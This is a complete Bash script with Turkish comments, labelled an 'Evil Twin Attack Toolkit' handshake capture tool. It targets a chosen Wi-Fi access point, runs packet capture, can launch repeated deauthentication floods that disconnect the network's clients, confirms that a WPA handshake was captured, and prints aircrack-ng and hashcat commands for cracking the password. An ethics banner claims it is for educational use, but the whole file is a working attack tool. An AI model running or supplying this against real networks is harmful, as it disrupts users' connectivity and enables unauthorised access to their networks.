#!/bin/bash

# Evil Twin Attack - Handshake Capture Script
# Bu script belirli bir ağı izler ve WPA handshake yakalar
# Kullanım: ./handshake_capture.sh [interface] [bssid] [channel]

# Renkli çıktı için ANSI kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${PURPLE}"
echo "═══════════════════════════════════════════════════════════════"
echo "                    EVIL TWIN ATTACK TOOLKIT                  "
echo "                    Handshake Capture Tool                    "
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

# Root kontrolü
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Bu script root yetkileri ile çalıştırılmalıdır!${NC}"
   echo -e "${YELLOW}[*] Kullanım: sudo $0 [interface] [bssid] [channel]${NC}"
   exit 1
fi

# Etik uyarı
echo -e "${RED}"
echo "⚠️  ETİK UYARI ⚠️"
echo "Bu araç yalnızca eğitim amaçlı ve kendi ağlarınızda test için kullanılmalıdır."
echo "İzinsiz ağları hedef almak yasadışıdır ve ciddi hukuki sonuçları olabilir."
echo "Bu aracı kullanarak tüm sorumluluğu kabul etmiş olursunuz."
echo -e "${NC}"

# Parametreler
INTERFACE="$1"
TARGET_BSSID="$2"
TARGET_CHANNEL="$3"
OUTPUT_DIR="/tmp/evil_twin_handshakes"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
CAPTURE_FILE="$OUTPUT_DIR/handshake_$TIMESTAMP"
LOG_FILE="$OUTPUT_DIR/capture_log_$TIMESTAMP.txt"
MAX_CAPTURE_TIME="300"  # 5 dakika
DEAUTH_COUNT="10"
DEAUTH_INTERVAL="5"
AUTO_DEAUTH=false
VERBOSE=false
CONTINUOUS=false
SAVE_ALL_TRAFFIC=false

# Fonksiyonlar
print_status() {
    echo -e "${BLUE}[*] $1${NC}"
    echo "$(date): [INFO] $1" >> "$LOG_FILE"
}

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
    echo "$(date): [SUCCESS] $1" >> "$LOG_FILE"
}

print_error() {
    echo -e "${RED}[!] $1${NC}"
    echo "$(date): [ERROR] $1" >> "$LOG_FILE"
}

print_warning() {
    echo -e "${YELLOW}[⚠] $1${NC}"
    echo "$(date): [WARNING] $1" >> "$LOG_FILE"
}

# Kullanım bilgisi
show_usage() {
    echo -e "${YELLOW}Kullanım:${NC}"
    echo -e "  ${CYAN}$0 [interface] [bssid] [channel] [options]${NC}"
    echo
    echo -e "${YELLOW}Parametreler:${NC}"
    echo -e "  ${CYAN}interface${NC}     Monitor mode'daki kablosuz arayüz"
    echo -e "  ${CYAN}bssid${NC}         Hedef access point BSSID'si"
    echo -e "  ${CYAN}channel${NC}       Hedef kanalı (1-14)"
    echo
    echo -e "${YELLOW}Seçenekler:${NC}"
    echo -e "  ${CYAN}-t, --time <seconds>${NC}     Maksimum yakalama süresi (varsayılan: 300)"
    echo -e "  ${CYAN}-o, --output <dir>${NC}      Çıktı dizini"
    echo -e "  ${CYAN}-d, --deauth${NC}            Otomatik deauth saldırısı"
    echo -e "  ${CYAN}-c, --count <num>${NC}       Deauth paket sayısı (varsayılan: 10)"
    echo -e "  ${CYAN}-i, --interval <sec>${NC}    Deauth aralığı (varsayılan: 5)"
    echo -e "  ${CYAN}-a, --all${NC}               Tüm trafiği kaydet"
    echo -e "  ${CYAN}-C, --continuous${NC}        Sürekli yakalama"
    echo -e "  ${CYAN}-v, --verbose${NC}           Detaylı çıktı"
    echo -e "  ${CYAN}-h, --help${NC}              Bu yardım mesajı"
    echo
    echo -e "${YELLOW}Örnekler:${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon AA:BB:CC:DD:EE:FF 6${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon AA:BB:CC:DD:EE:FF 6 -d -c 20${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0mon AA:BB:CC:DD:EE:FF 6 -t 600 -a${NC}"
    echo
}

# Komut satırı argümanlarını işle
parse_arguments() {
    # İlk 3 parametre pozisyonel
    if [ $# -ge 3 ]; then
        INTERFACE="$1"
        TARGET_BSSID="$2"
        TARGET_CHANNEL="$3"
        shift 3
    fi
    
    # Kalan parametreler seçenekler
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--time)
                MAX_CAPTURE_TIME="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -d|--deauth)
                AUTO_DEAUTH=true
                shift
                ;;
            -c|--count)
                DEAUTH_COUNT="$2"
                shift 2
                ;;
            -i|--interval)
                DEAUTH_INTERVAL="$2"
                shift 2
                ;;
            -a|--all)
                SAVE_ALL_TRAFFIC=true
                shift
                ;;
            -C|--continuous)
                CONTINUOUS=true
                shift
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            -*)
                print_error "Bilinmeyen seçenek: $1"
                show_usage
                exit 1
                ;;
            *)
                print_error "Fazla parametre: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

# Parametreleri kontrol et
validate_parameters() {
    if [ -z "$INTERFACE" ] || [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
        print_error "Eksik parametreler!"
        show_usage
        exit 1
    fi
    
    # BSSID formatını kontrol et
    if ! echo "$TARGET_BSSID" | grep -qE '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'; then
        print_error "Geçersiz BSSID formatı: $TARGET_BSSID"
        print_status "Doğru format: XX:XX:XX:XX:XX:XX"
        exit 1
    fi
    
    # Kanal kontrolü
    if ! [[ "$TARGET_CHANNEL" =~ ^[1-9]$|^1[0-4]$ ]]; then
        print_error "Geçersiz kanal: $TARGET_CHANNEL (1-14 arası olmalı)"
        exit 1
    fi
    
    # Arayüz kontrolü
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        print_error "Arayüz bulunamadı: $INTERFACE"
        exit 1
    fi
    
    # Monitor mode kontrolü
    if ! iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
        print_error "Arayüz monitor mode'da değil: $INTERFACE"
        print_status "Monitor mode için: airmon-ng start $INTERFACE"
        exit 1
    fi
}

# Çıktı dizinini hazırla
setup_output_directory() {
    if [ ! -d "$OUTPUT_DIR" ]; then
        mkdir -p "$OUTPUT_DIR"
        print_status "Çıktı dizini oluşturuldu: $OUTPUT_DIR"
    fi
    
    # Dosya yollarını güncelle
    CAPTURE_FILE="$OUTPUT_DIR/handshake_$TIMESTAMP"
    LOG_FILE="$OUTPUT_DIR/capture_log_$TIMESTAMP.txt"
    
    print_status "Yakalama dosyası: $CAPTURE_FILE"
    print_status "Log dosyası: $LOG_FILE"
}

# Arayüzü hazırla
setup_interface() {
    print_status "Arayüz hazırlanıyor: $INTERFACE"
    
    # Kanala ayarla
    print_status "Kanal $TARGET_CHANNEL'a ayarlanıyor..."
    iwconfig "$INTERFACE" channel "$TARGET_CHANNEL"
    
    if [ $? -eq 0 ]; then
        print_success "Kanal $TARGET_CHANNEL'a ayarlandı"
    else
        print_error "Kanal ayarlanamadı!"
        exit 1
    fi
    
    # Arayüz durumunu kontrol et
    local current_channel=$(iwconfig "$INTERFACE" 2>/dev/null | grep -oP 'Channel[=:]\K[0-9]+' | head -1)
    print_status "Mevcut kanal: $current_channel"
}

# Hedef ağı kontrol et
check_target_network() {
    print_status "Hedef ağ kontrol ediliyor..."
    
    # Kısa tarama yap
    timeout 10 airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w /tmp/target_check --output-format csv "$INTERFACE" > /dev/null 2>&1
    
    local csv_file="/tmp/target_check-01.csv"
    
    if [ -f "$csv_file" ]; then
        local network_found=$(grep "^$TARGET_BSSID," "$csv_file")
        
        if [ -n "$network_found" ]; then
            # Ağ bilgilerini çıkar
            IFS=',' read -ra INFO <<< "$network_found"
            local essid="${INFO[13]}"
            local power="${INFO[8]}"
            local security="${INFO[5]}"
            
            print_success "Hedef ağ bulundu!"
            echo -e "  ${CYAN}BSSID:${NC} $TARGET_BSSID"
            echo -e "  ${CYAN}ESSID:${NC} $essid"
            echo -e "  ${CYAN}Güç:${NC} $power dBm"
            echo -e "  ${CYAN}Güvenlik:${NC} $security"
            
            # WPA kontrolü
            if [[ "$security" =~ WPA ]]; then
                print_success "WPA/WPA2 ağı - handshake yakalanabilir"
            else
                print_warning "Bu ağ WPA/WPA2 kullanmıyor - handshake yakalanamayabilir"
            fi
        else
            print_error "Hedef ağ bulunamadı!"
            print_status "BSSID ve kanal bilgilerini kontrol edin"
            exit 1
        fi
        
        # Temizlik
        rm -f /tmp/target_check*
    else
        print_warning "Hedef ağ kontrolü yapılamadı"
    fi
}

# Bağlı istemcileri kontrol et
check_connected_clients() {
    print_status "Bağlı istemciler kontrol ediliyor..."
    
    # İstemci taraması
    timeout 15 airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w /tmp/client_check --output-format csv "$INTERFACE" > /dev/null 2>&1
    
    local csv_file="/tmp/client_check-01.csv"
    
    if [ -f "$csv_file" ]; then
        # İstemci sayısını kontrol et
        local client_count=$(awk -F',' '/^[0-9A-Fa-f:]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*$/ && NF==14 {next} /^[0-9A-Fa-f:]*,/ {print}' "$csv_file" | wc -l)
        
        if [ "$client_count" -gt 0 ]; then
            print_success "$client_count istemci bulundu"
            
            if [ "$VERBOSE" = true ]; then
                echo -e "${CYAN}Bağlı istemciler:${NC}"
                awk -F',' '/^[0-9A-Fa-f:]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*,[^,]*$/ && NF==14 {next} /^[0-9A-Fa-f:]*,/ { 
                    gsub(/^ +| +$/, "", $1)
                    gsub(/^ +| +$/, "", $4)
                    gsub(/^ +| +$/, "", $6)
                    if ($1 != "" && $4 != "") {
                        printf "  %s (Güç: %s dBm)\n", $1, $4
                    }
                }' "$csv_file"
            fi
        else
            print_warning "Bağlı istemci bulunamadı"
            print_status "Handshake yakalamak için istemci bağlantısı gerekli"
        fi
        
        # Temizlik
        rm -f /tmp/client_check*
    fi
}

# Handshake yakalama
capture_handshake() {
    print_status "Handshake yakalama başlatılıyor..."
    print_status "Maksimum süre: $MAX_CAPTURE_TIME saniye"
    
    local airodump_cmd="airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $CAPTURE_FILE"
    
    if [ "$SAVE_ALL_TRAFFIC" = false ]; then
        airodump_cmd="$airodump_cmd --output-format pcap"
    else
        airodump_cmd="$airodump_cmd --output-format pcap,csv"
    fi
    
    airodump_cmd="$airodump_cmd $INTERFACE"
    
    print_status "Komut: $airodump_cmd"
    
    # Yakalamayı başlat
    $airodump_cmd > /dev/null 2>&1 &
    local capture_pid=$!
    
    print_success "Yakalama başlatıldı (PID: $capture_pid)"
    
    # Otomatik deauth saldırısı
    if [ "$AUTO_DEAUTH" = true ]; then
        sleep 5  # Yakalama başlaması için bekle
        start_deauth_attack &
        local deauth_pid=$!
        print_status "Deauth saldırısı başlatıldı (PID: $deauth_pid)"
    fi
    
    # İlerleme takibi
    local counter=0
    local handshake_found=false
    
    while [ $counter -lt $MAX_CAPTURE_TIME ] && kill -0 $capture_pid 2>/dev/null; do
        printf "\r${BLUE}[*] Yakalama devam ediyor... %d/%d saniye${NC}" $counter $MAX_CAPTURE_TIME
        
        # Handshake kontrolü (her 10 saniyede bir)
        if [ $((counter % 10)) -eq 0 ] && [ $counter -gt 0 ]; then
            if check_handshake_captured; then
                handshake_found=true
                break
            fi
        fi
        
        sleep 1
        ((counter++))
    done
    
    printf "\n"
    
    # Süreçleri sonlandır
    if kill -0 $capture_pid 2>/dev/null; then
        kill $capture_pid 2>/dev/null
        wait $capture_pid 2>/dev/null
    fi
    
    if [ "$AUTO_DEAUTH" = true ] && [ -n "$deauth_pid" ]; then
        kill $deauth_pid 2>/dev/null
        wait $deauth_pid 2>/dev/null
    fi
    
    # Son handshake kontrolü
    if [ "$handshake_found" = false ]; then
        check_handshake_captured
    fi
}

# Deauth saldırısı
start_deauth_attack() {
    while true; do
        print_status "Deauth saldırısı gönderiliyor ($DEAUTH_COUNT paket)..."
        
        # Tüm istemcilere deauth gönder
        aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1
        
        if [ "$VERBOSE" = true ]; then
            print_status "Deauth paketleri gönderildi"
        fi
        
        sleep "$DEAUTH_INTERVAL"
    done
}

# Handshake kontrolü
check_handshake_captured() {
    local pcap_file="$CAPTURE_FILE-01.cap"
    
    if [ ! -f "$pcap_file" ]; then
        return 1
    fi
    
    # aircrack-ng ile handshake kontrolü
    local handshake_check=$(aircrack-ng "$pcap_file" 2>/dev/null | grep -i "handshake")
    
    if [ -n "$handshake_check" ]; then
        print_success "WPA Handshake yakalandı!"
        print_status "Dosya: $pcap_file"
        return 0
    fi
    
    return 1
}

# Yakalama sonuçlarını analiz et
analyze_capture() {
    local pcap_file="$CAPTURE_FILE-01.cap"
    
    if [ ! -f "$pcap_file" ]; then
        print_error "Yakalama dosyası bulunamadı: $pcap_file"
        return 1
    fi
    
    print_status "Yakalama sonuçları analiz ediliyor..."
    
    # Dosya boyutu
    local file_size=$(du -h "$pcap_file" | cut -f1)
    print_status "Dosya boyutu: $file_size"
    
    # Paket sayısı
    local packet_count=$(capinfos "$pcap_file" 2>/dev/null | grep "Number of packets" | awk '{print $4}' || echo "Bilinmiyor")
    print_status "Toplam paket: $packet_count"
    
    # Handshake kontrolü
    echo
    print_status "Handshake analizi:"
    
    local aircrack_output=$(aircrack-ng "$pcap_file" 2>/dev/null)
    
    if echo "$aircrack_output" | grep -qi "handshake"; then
        print_success "WPA Handshake başarıyla yakalandı!"
        
        # Handshake detayları
        echo -e "${GREEN}"
        echo "═══════════════════════════════════════════════════════════════"
        echo "                    HANDSHAKE YAKALANDI                       "
        echo "═══════════════════════════════════════════════════════════════"
        echo -e "${NC}"
        
        echo -e "${CYAN}Hedef BSSID:${NC} $TARGET_BSSID"
        echo -e "${CYAN}Kanal:${NC} $TARGET_CHANNEL"
        echo -e "${CYAN}Dosya:${NC} $pcap_file"
        echo -e "${CYAN}Boyut:${NC} $file_size"
        echo -e "${CYAN}Paket Sayısı:${NC} $packet_count"
        echo
        
        # Kırma önerisi
        print_status "Şifre kırma önerisi:"
        echo -e "  ${CYAN}aircrack-ng -w wordlist.txt $pcap_file${NC}"
        echo -e "  ${CYAN}hashcat -m 2500 $pcap_file wordlist.txt${NC}"
        echo
        
    else
        print_warning "Handshake yakalanamadı"
        print_status "Olası nedenler:"
        echo -e "  ${YELLOW}- İstemci bağlı değil${NC}"
        echo -e "  ${YELLOW}- Deauth saldırısı etkisiz${NC}"
        echo -e "  ${YELLOW}- Ağ WPA/WPA2 kullanmıyor${NC}"
        echo -e "  ${YELLOW}- Yakalama süresi yetersiz${NC}"
        echo
        
        # Tekrar deneme önerisi
        print_status "Tekrar deneme önerileri:"
        echo -e "  ${CYAN}- Deauth saldırısı ile: $0 $INTERFACE $TARGET_BSSID $TARGET_CHANNEL -d${NC}"
        echo -e "  ${CYAN}- Daha uzun süre: $0 $INTERFACE $TARGET_BSSID $TARGET_CHANNEL -t 600${NC}"
        echo -e "  ${CYAN}- Daha fazla deauth: $0 $INTERFACE $TARGET_BSSID $TARGET_CHANNEL -d -c 50${NC}"
        echo
    fi
}

# Sürekli yakalama
continuous_capture() {
    print_status "Sürekli yakalama modu başlatılıyor..."
    print_warning "Durdurmak için Ctrl+C tuşlayın"
    
    local attempt=1
    
    while true; do
        echo
        print_status "Yakalama denemesi #$attempt"
        
        # Yeni timestamp
        TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
        CAPTURE_FILE="$OUTPUT_DIR/handshake_$TIMESTAMP"
        
        # Yakalama yap
        capture_handshake
        
        # Handshake kontrolü
        if check_handshake_captured; then
            print_success "Handshake yakalandı! Sürekli mod durduruluyor."
            analyze_capture
            break
        else
            print_warning "Handshake yakalanamadı, tekrar deneniyor..."
        fi
        
        ((attempt++))
        
        # 30 saniye bekle
        print_status "30 saniye bekleniyor..."
        sleep 30
    done
}

# Temizlik
cleanup() {
    print_status "Temizlik yapılıyor..."
    
    # Arka plan süreçlerini sonlandır
    pkill -f "airodump-ng.*$INTERFACE" 2>/dev/null
    pkill -f "aireplay-ng.*$INTERFACE" 2>/dev/null
    
    # Geçici dosyaları temizle
    rm -f /tmp/target_check* /tmp/client_check*
    
    print_success "Temizlik tamamlandı"
}

# Ana fonksiyon
main() {
    echo
    print_status "Handshake capture başlatılıyor..."
    echo
    
    # Parametreleri kontrol et
    validate_parameters
    
    # Çıktı dizinini hazırla
    setup_output_directory
    
    # Arayüzü hazırla
    setup_interface
    
    echo
    print_status "Yakalama parametreleri:"
    echo -e "  ${CYAN}Arayüz:${NC} $INTERFACE"
    echo -e "  ${CYAN}Hedef BSSID:${NC} $TARGET_BSSID"
    echo -e "  ${CYAN}Kanal:${NC} $TARGET_CHANNEL"
    echo -e "  ${CYAN}Maksimum Süre:${NC} $MAX_CAPTURE_TIME saniye"
    echo -e "  ${CYAN}Otomatik Deauth:${NC} $([ "$AUTO_DEAUTH" = true ] && echo "Evet" || echo "Hayır")"
    echo -e "  ${CYAN}Çıktı:${NC} $OUTPUT_DIR"
    echo
    
    # Hedef ağı kontrol et
    check_target_network
    
    # Bağlı istemcileri kontrol et
    check_connected_clients
    
    echo
    
    # Sürekli yakalama kontrolü
    if [ "$CONTINUOUS" = true ]; then
        continuous_capture
    else
        # Tek yakalama
        capture_handshake
        
        # Sonuçları analiz et
        analyze_capture
    fi
    
    echo
    print_success "Handshake capture tamamlandı!"
    echo -e "${YELLOW}Sonuç dosyaları:${NC}"
    echo -e "  ${CYAN}PCAP:${NC} $CAPTURE_FILE-01.cap"
    echo -e "  ${CYAN}Log:${NC} $LOG_FILE"
    echo
}

# Sinyal yakalama
trap cleanup EXIT INT TERM

# Komut satırı argümanlarını işle
parse_arguments "$@"

# Ana fonksiyonu çalıştır
main